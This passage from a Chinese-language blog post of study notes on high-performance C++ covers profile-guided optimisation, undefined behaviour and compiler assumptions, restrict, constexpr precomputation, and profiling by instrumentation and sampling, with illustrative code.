<p>使用 <code>-fprofile-generate</code> 标志，GCC 会在程序中插入 profiling 代码，生成能够跟踪执行情况的数据文件。假设你在编译源代码时使用如下命令：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">g++ -fprofile-generate [其他编译选项] source.cc -o binary</span><br></pre></td></tr></table></figure></div>
<p>然后运行该程序，理想情况下使用与真实场景接近的数据输入，这样生成的数据才具有代表性。运行程序后，会生成 <code>.gcda</code> 文件，这些文件包含了测试运行期间的 profiling 数据。</p>
<p><strong>步骤 2：基于 Profiling 数据优化编译</strong></p>
<p>在第二次编译时，使用 <code>-fprofile-use</code> 标志，这样编译器就能使用第一次运行中收集到的 profiling 数据来进行优化：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">g++ -fprofile-use [其他编译选项] source.cc -o binary</span><br></pre></td></tr></table></figure></div>
<p>这时，编译器能够利用收集到的信息做出更加精准的优化。PGO 可以显著提升程序的执行效率，尤其是在大型代码库中，通常可以带来 10-20% 的性能提升。由于这种优化是基于实际数据的，它能比传统的静态优化方法更有效。对于性能至关重要的项目，PGO 是一个常见的优化手段。</p>
<h4 id="契约式编程"><a href="#契约式编程" class="headerlink" title="契约式编程"></a>契约式编程</h4><p>在 Java 和 Rust 这样的“安全”语言中，通常对每个可能的操作和输入都有明确的行为定义。有些细节（如哈希表的键顺序或 <code>std::vector</code> 的增长因子）可能会因实现不同而有所不同，但这些通常只是为了性能优化而留给实现的细节。</p>
<p>相比之下，C 和 C++ 的 <strong>未定义行为（Undefined Behavior, UB）</strong> 概念则要极端得多。在这些语言中，某些操作不会在编译或运行时产生错误，但在标准中它们是不被允许的。这意味着程序员和编译器之间有一种契约：<strong>如果代码触发了未定义行为，编译器可以做任何事情</strong>，包括使显示器爆炸或格式化硬盘（虽然实际不会发生）。编译器工程师不会故意制造这些后果，而是利用未定义行为来消除边界情况（corner cases），从而进行更激进的优化。</p>
<p>未定义行为的主要原因可以分为 <strong>两大类</strong>：</p>
<p>这些错误几乎总是程序员的无心之失，例如：</p>
<ol>
<li><strong>明显的程序错误</strong></li>
</ol>
<ul>
<li><strong>除零</strong></li>
<li><strong>解引用空指针</strong></li>
<li><strong>访问未初始化的内存</strong></li>
</ul>
<p>与其让这些操作返回一个固定的回退值（如 0），不如让程序在测试时崩溃或表现出不可预测的行为，以便尽早发现错误。</p>
<ol>
<li><strong>平台相关的行为</strong></li>
</ol>
<p>有些操作在不同的 CPU 架构上表现不同。例如：</p>
<ul>
<li><p><strong>整数左移超出位宽</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">1</span> &lt;&lt; <span class="number">32</span>;  <span class="comment">// UB</span></span><br></pre></td></tr></table></figure></div>
<p>这个操作在 x86 和 ARM 上可能会产生不同的结果。如果 C++ 标准指定某种行为，那就意味着某些架构必须额外做一次检查，影响性能。因此，<strong>C++ 直接规定它是 UB，避免额外的运行时开销。</strong></p>
</li>
</ul>
<p><strong>负数的右移</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">-42</span>;</span><br><span class="line">x &gt;&gt;= <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
<p>在某些架构上，右移负数会补 1（算术右移），在其他架构上可能会补 0（逻辑右移）。C++ 允许这种行为由实现决定，而不是设为 UB，因此它是 <strong>实现定义（implementation-defined）</strong> 而不是未定义行为。</p>
<p>保留未定义行为有时候能够帮助编译器优化，比如实际在c++中，有符号整型（<strong>signed int</strong>）的溢出就是一个<strong>UB</strong>，但无符号整型（<strong>unsigned int</strong>）的溢出是被允许的，也就是说其实如果x为有符号整型，那么<code>(x + 1) &gt; x</code>这个条件就<strong>恒为true</strong>，体现在编译器的处理过程上，他可能会直接优化整个分支。比如有如下代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">foo</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x + <span class="number">1</span> &lt; x) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Overflow happened!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">foo</span>(<span class="number">0x7fffffff</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>我们可能认为程序最后会打印<code>&quot;Overflow happened!&quot;</code>，但实际上我们用g++编译后拿IDA查看对应的代码，就会发现整个<strong>foo</strong>函数的分支就被优化掉了。而如果foo参数类型为<strong>unsigned int</strong>，编译器就会如我们所想，编译出实现对应分支的汇编。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250312234659884.png"
                      class=""
                >
<p><strong>去除边界情况</strong></p>
<p>“安全“的编程模式经常包括大量的边界检测，但这<strong>不一定会带来性能损失</strong>，因为编译器可能在编译阶段就能保证数据是在边界范围内的，由此可以直接安全的优化掉边界检测。</p>
<p>我们也可以手动使用<code>__builtin_unreachable</code> 来消除边界检查，比如我们有如下代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cassert&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">assume</span><span class="params">(<span class="type">bool</span> pred)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!pred)</span><br><span class="line">        __builtin_unreachable();  <span class="comment">// 告诉编译器这里不可能执行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">safe_at</span><span class="params">(std::vector&lt;<span class="type">int</span>&gt;&amp; v, <span class="type">size_t</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">assume</span>(k &lt; v.<span class="built_in">size</span>());  <span class="comment">// 假设 k 一定合法</span></span><br><span class="line">    <span class="keyword">return</span> v.<span class="built_in">at</span>(k);        <span class="comment">// 编译器现在可能会优化掉边界检查</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(std::vector&lt;<span class="type">int</span>&gt;&amp; v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">size</span>()<span class="number">+1</span>; i++) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="built_in">safe_at</span>(v,i) &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="built_in">test</span>(v);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里我把循环次数设置为了<code>v.size()+1</code>，也就是刚好越界，之后我们进行编译测试一下会发现，当开启<strong>O2及以上</strong>优化时，编译器就会根据我们的提示，优化掉vector的at中的边界检测了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313114341492.png"
                      class=""
                >
<p>我们还可以<strong>结合 <code>assert()</code> 进行 Debug</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cassert&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">assume</span><span class="params">(<span class="type">bool</span> pred)</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">assert</span>(pred);  <span class="comment">// Debug 模式下检查假设</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (!pred)</span><br><span class="line">        __builtin_unreachable();  <span class="comment">// Release 模式下优化边界检查</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">safe_at</span><span class="params">(std::vector&lt;<span class="type">int</span>&gt;&amp; v, <span class="type">size_t</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">assume</span>(k &lt; v.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">return</span> v[k];  <span class="comment">// 现在可以使用 `operator[]` 而不会触发未定义行为</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Debug 版本：<code>assert(k &lt; v.size());</code> 可以在运行时捕捉错误。</li>
<li>Release 版本：编译器会移除 <code>assume()</code>，并优化掉不必要的边界检查。</li>
</ul>
<p>在进行算术运算时，我们尤其要关注边界条件。而其中浮点数的优化比较简单，我们只用加入<code>-ffast-math</code>编译选项即可。</p>
<p>在默认情况下，编译器 <strong>必须</strong> 严格遵守 <strong>IEEE 754 浮点运算标准</strong>，例如：</p>
<ul>
<li>保证 <strong>运算的顺序</strong> 不能随意改变</li>
<li>处理 <strong>NaN</strong>（非数 <code>Not a Number</code>）和 <strong>无穷大</strong></li>
<li>保证 <strong>精度</strong> 及 <strong>舍入模式</strong></li>
</ul>
<p>但是，这种严格遵守会 <strong>阻碍优化</strong>。使用 <code>-ffast-math</code> 选项后，编译器可以 <strong>忽略一些 IEEE 754 规则</strong>，以换取更快的执行速度。</p>
<p>然后我们考虑一下整数的情况，首先是无符号整型，比如有以下代码。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">div_unsigned</span><span class="params">(<span class="type">unsigned</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>我们知道除法对应的指令开销是很大的，一种非常常用的优化就是改为移位运算<code>x &gt;&gt; 1</code>。也就是<code>shr eax</code>。</p>
<p>但如果换成有符号整型，情况就有一点不同了。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">div_signed</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>如果x是负数，那么无论是算术右移位还是逻辑右移位，都会得到错误的结果。所以为了考虑到所有情况，需要用以下的汇编技巧实现：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov  ebx, eax</span><br><span class="line">shr  ebx, 31    ; extract the sign bit</span><br><span class="line">add  eax, ebx   ; add 1 to the value if it is negative to ensure rounding towards zero</span><br><span class="line">sar  eax        ; this one shifts in sign bits</span><br></pre></td></tr></table></figure></div>
<p>这样的技巧比起简单的<code>shr eax</code>开销大了不少，效率只有原来的1/4，所以我们有时候如果<strong>认定x为正数</strong>，就可以用之前提到的<strong>assume</strong>方式来提示编译器优化掉边界条件的处理。</p>
<p>编译器在优化涉及<strong>内存读写</strong>的操作时通常比较困难，因为它们可能无法确定不同指针是否指向<strong>相同的内存区域</strong>。这会影响 <strong>指令重排、向量化（SIMD）、并行执行</strong> 等优化策略。</p>
<p>考虑如下代码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        a[i] += b[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>编译器的视角</strong>：</p>
<ul>
<li>在每次 <code>a[i] += b[i]</code> 操作中，<code>a[i]</code> 依赖于 <code>b[i]</code> 的值。</li>
<li>由于 <code>a</code> 和 <code>b</code> 都是指针，编译器无法确定它们是否指向<strong>重叠的内存区域</strong>（aliasing）。</li>
<li>如果 <code>b == a - 1</code>（即 <code>b</code> 第二个元素指向 <code>a</code> ），那么 <code>b[i]</code> 可能是前一次循环 <code>a[i-1]</code> 的结果，导致数据<strong>依赖链</strong>，必须<strong>顺序执行</strong>。</li>
</ul>
<p><strong>C 语言中的 <code>restrict</code> 关键字</strong> 告诉编译器：</p>
<blockquote>
<p>这个指针是唯一访问该内存区域的方式，不会与其他指针发生 aliasing。</p>
</blockquote>
<p>优化后的代码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> * __restrict__ a, <span class="type">const</span> <span class="type">int</span> * __restrict__ b, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        a[i] += b[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>这样做的好处</strong>：</p>
<ul>
<li><strong>保证 <code>a</code> 和 <code>b</code> 不会指向重叠内存</strong>，编译器可以自由优化。</li>
<li><strong>开启自动向量化（SIMD）</strong>，提升性能。</li>
<li><strong>增强代码可读性</strong>，明确表达数据的访问方式。</li>
</ul>
<h4 id="预计算"><a href="#预计算" class="headerlink" title="预计算"></a>预计算</h4><p>在 C++ 编译优化中，<strong>预计算（Precomputation）</strong> 是一个关键技术。当编译器能够推断出某个变量的值<strong>仅依赖于编译时已知的数据</strong>，它可以直接在编译期计算这个值，并将其<strong>作为常量嵌入到机器代码中</strong>。</p>
<p>这可以显著提高运行时性能，但：</p>
<ul>
<li>这并非 C++ 标准的一部分，因此不同编译器可能会有不同的优化策略。</li>
<li>如果计算量过大，编译器可能会<strong>放弃预计算</strong>，转而保留运行时计算。</li>
</ul>
<p><strong>常量表达式（Constant Expressions）</strong></p>
<p>为了解决预计算的不确定性，C++ 允许显式指定某些函数为 <code>constexpr</code>，这样编译器<strong>必须</strong>在编译期计算它们的值（如果参数是常量）。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">constexpr</span> <span class="type">int</span> <span class="title">fibonacci</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fibonacci</span>(n - <span class="number">1</span>) + <span class="built_in">fibonacci</span>(n - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">fibonacci</span>(<span class="number">10</span>) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在这个例子中<code>fibonacci(10)</code> 会在<strong>编译时计算</strong>并被替换成 <code>55</code>，而不会出现在运行时计算中。比如我们开O2优化后，就能看到已经不存在<strong>fibonacci</strong>函数，而是直接硬编码55输出了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313133854264.png"
                      class=""
                >
<p><code>constexpr</code> 关键字带有一定限制：</p>
<ul>
<li>只能调用<strong>其他 <code>constexpr</code> 函数</strong>。</li>
<li><strong>不能进行动态内存分配</strong>（如 <code>new</code>）。</li>
<li>不能有<strong>运行时不可预测的行为</strong>（如读取文件、I/O 操作等）。</li>
</ul>
<p>但随着 C++ 标准的演进，这些限制逐渐减少。由于<strong>递归版本效率低</strong>，C++17 允许 <code>constexpr</code> 函数使用 <strong>循环</strong>，提高计算效率：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">constexpr</span> <span class="type">int</span> <span class="title">fibonacci</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">        <span class="type">int</span> c = a + b;</span><br><span class="line">        a = b;</span><br><span class="line">        b = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这样 <code>fibonacci(100)</code> 之类的计算在编译期就能高效完成。</p>
<p>C++17 之后，可以使用 <code>constexpr</code> 构造<strong>静态查找表</strong>，这对于<strong>预计算平方根、对数等复杂数学运算</strong>特别有用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Precalc</span> &#123;</span><br><span class="line">    <span class="type">int</span> isqrt[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">constexpr</span> <span class="title">Precalc</span><span class="params">()</span> : isqrt&#123;</span>&#125; &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">            isqrt[i] = <span class="built_in">int</span>(<span class="built_in">sqrt</span>(i));  <span class="comment">// 预计算整数平方根</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> Precalc P;</span><br><span class="line"></span><br><span class="line"><span class="built_in">static_assert</span>(P.isqrt[<span class="number">42</span>] == <span class="number">6</span>);  <span class="comment">// 在编译期检查</span></span><br></pre></td></tr></table></figure></div>
<p>在这个例子中：</p>
<ul>
<li><code>Precalc</code> 结构体在<strong>编译期</strong>计算 <code>isqrt</code> 数组，并存储所有 <code>0~999</code> 的整数平方根。</li>
<li>这样，在运行时我们可以直接查表，而不需要重复计算 <code>sqrt()</code>。</li>
</ul>
<h3 id="五、性能测试（Profiling）"><a href="#五、性能测试（Profiling）" class="headerlink" title="五、性能测试（Profiling）"></a>五、性能测试（Profiling）</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p><strong>仅仅看源代码或者汇编并不能精准找到性能瓶颈，必须使用合适的性能分析工具</strong>。分析方法主要分为三种：</p>
<ul>
<li><p><strong>Instrumentation（插桩分析）</strong></p>
</li>
<li><p><strong>Statistical Profiling（统计分析）</strong></p>
</li>
<li><p><strong>Program Simulation（程序模拟）</strong></p>
</li>
</ul>
<h4 id="插桩分析（Instrumentation）"><a href="#插桩分析（Instrumentation）" class="headerlink" title="插桩分析（Instrumentation）"></a>插桩分析（Instrumentation）</h4><h5 id="计时"><a href="#计时" class="headerlink" title="计时"></a>计时</h5><p>用于测量代码执行时间，找到需要优化的部分。基本方法是使用 <code>clock()</code> 记录起始时间，执行函数后计算时间差。例如：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">clock_t</span> start = <span class="built_in">clock</span>();</span><br><span class="line"><span class="built_in">do_something</span>();</span><br><span class="line"><span class="type">float</span> seconds = <span class="built_in">float</span>(<span class="built_in">clock</span>() - start) / CLOCKS_PER_SEC;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;do_something() took %.4f seconds\n&quot;</span>, seconds);</span><br></pre></td></tr></table></figure></div>
<p>由于 <code>clock()</code> 本身精度有限（微秒级），如果函数执行时间很短，单次测量会受到较大误差的影响。改进的方法是在循环中<strong>多次执行函数</strong>，然后计算平均时间：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>;</span><br><span class="line"><span class="type">clock_t</span> start = <span class="built_in">clock</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) </span><br><span class="line">    <span class="built_in">clock</span>(); <span class="comment">// 这里是测量 `clock()` 函数自身的开销</span></span><br><span class="line"><span class="type">float</span> duration = <span class="built_in">float</span>(<span class="built_in">clock</span>() - start) / CLOCKS_PER_SEC;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f ns per iteration\n&quot;</span>, <span class="number">1e9</span> * duration / N);</span><br></pre></td></tr></table></figure></div>
<p>这种方法能够降低误差，但仍需注意缓存、编译器优化等影响。</p>
<h5 id="事件采样"><a href="#事件采样" class="headerlink" title="事件采样"></a>事件采样</h5><p>用于统计特定算法的特征，例如：</p>
<ul>
<li>哈希函数：关注输入数据的平均长度；</li>
<li>二叉树：关注其高度和节点数；</li>
<li>排序算法：统计比较操作的次数。</li>
</ul>
<p><strong>基本方法</strong>是直接在代码中<strong>插入计数器</strong>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    count++; <span class="comment">// 统计调用次数</span></span><br><span class="line">    <span class="comment">// 执行核心逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>缺点是如果调用次数过多，这会带来额外的性能开销。实际上看似这里的count++也增加不了多少花销，但如果统计数据的存储需要：</p>
<ul>
<li><strong>存入数组</strong> → 可能导致 <strong>CPU 缓存失效</strong>，因为 <code>count++</code> 会不断写入一个变量，而采样写入的次数更少；</li>
<li><strong>写入日志/文件</strong> → 频繁写入磁盘 I/O 代价极高，减少存储次数有利于性能；</li>
<li><strong>存入数据库</strong> → 频繁更新数据库可能导致事务开销增加。</li>
</ul>
<p>比如<code>query()</code> 被调用 <strong>10 亿次</strong>，那么 <code>stats</code> 可能占用 <strong>多个 GB 内存</strong>，并且 CPU 可能会因为缓存未命中导致性能下降。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 直接计数，每次都写入数组</span></span><br><span class="line"><span class="type">int</span> stats[<span class="number">1000000000</span>]; <span class="comment">// 占用大量内存</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    stats[query_id++] = some_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在这些情况下，<strong>随机采样可以降低存储和 I/O 开销</strong>。显著提高缓存命中率、减少 I/O 压力。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">rand</span>() % <span class="number">100</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        sampled_stats[sample_id++] = some_value; <span class="comment">// 只存储 1% 的数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>不过上述随机采样实现方式也存在问题，如果我们要执行10亿次query，那就要调用10亿次rand函数。这里我们可以转用<strong>几何分布</strong>来进行随机抽样。<strong>几何分布的本质</strong>：它描述了<strong>成功事件（采样事件）发生之前的失败次数</strong>。假设我们仍然希望以 <strong>1% 的概率进行采样</strong>（即 <code>p = 0.01</code>），几何分布会<strong>直接生成下一个成功事件之前的失败次数</strong>。比如<code>geometric_distribution(0.01)</code> 可能返回 <strong>87</strong>，表示<strong>前 87 次都不会采样，第 88 次才会采样</strong>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> next_sample = <span class="built_in">geometric_distribution</span>(sample_rate);</span><br><span class="line">    <span class="keyword">if</span> (--next_sample == <span class="number">0</span>) &#123;  <span class="comment">// 只有当 next_sample 递减到 0 才采样</span></span><br><span class="line">        next_sample = <span class="built_in">geometric_distribution</span>(sample_rate);  <span class="comment">// 生成新的采样间隔</span></span><br><span class="line">        <span class="comment">// 更新统计数据</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 执行核心逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>比如我们用如下代码进行实验，最后就会输出10个左右的不同抽样值：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="type">double</span> sample_rate = <span class="number">0.01</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 用时间作为种子，避免伪随机</span></span><br><span class="line">    <span class="function"><span class="type">static</span> default_random_engine <span class="title">generator</span><span class="params">(chrono::steady_clock::now().time_since_epoch().count())</span></span>;</span><br><span class="line">    <span class="function"><span class="type">static</span> geometric_distribution&lt;<span class="type">int</span>&gt; <span class="title">dist</span><span class="params">(sample_rate)</span></span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> next_sample = <span class="built_in">dist</span>(generator);</span><br><span class="line">    <span class="keyword">if</span> (--next_sample == <span class="number">0</span>) &#123;  <span class="comment">// 只有当 next_sample 递减到 0 才采样</span></span><br><span class="line">        next_sample = <span class="built_in">dist</span>(generator);  <span class="comment">// 生成新的采样间隔</span></span><br><span class="line">        <span class="comment">// 更新统计数据</span></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;count: &quot;</span> &lt;&lt; count &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 执行核心逻辑</span></span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">query</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="统计分析（Statistical-Profiling）"><a href="#统计分析（Statistical-Profiling）" class="headerlink" title="统计分析（Statistical Profiling）"></a>统计分析（Statistical Profiling）</h4><p>在程序性能分析中，<strong>Instrumentation</strong>（插桩）方法虽然有效，但通常过于繁琐且容易带来额外开销。如果你需要分析程序中的多个小部分，或者需要较为细粒度的统计信息，Instrumentation的效果并不理想。<strong>Statistical Profiling</strong>（统计分析）则提供了一个更轻量且高效的方法。</p>
<p><strong>Statistical Profiling的工作原理</strong></p>
<p>统计分析通过在随机时间间隔中暂停程序的执行，并查看程序计数器指向的位置来进行性能分析。每次暂停时，程序的<strong>指令指针</strong>（Instruction Pointer，IP）会显示当前执行到的代码位置。通过在不同的函数块中进行暂停，可以得出一个大致的统计，反映出各个函数所消耗的执行时间。</p>
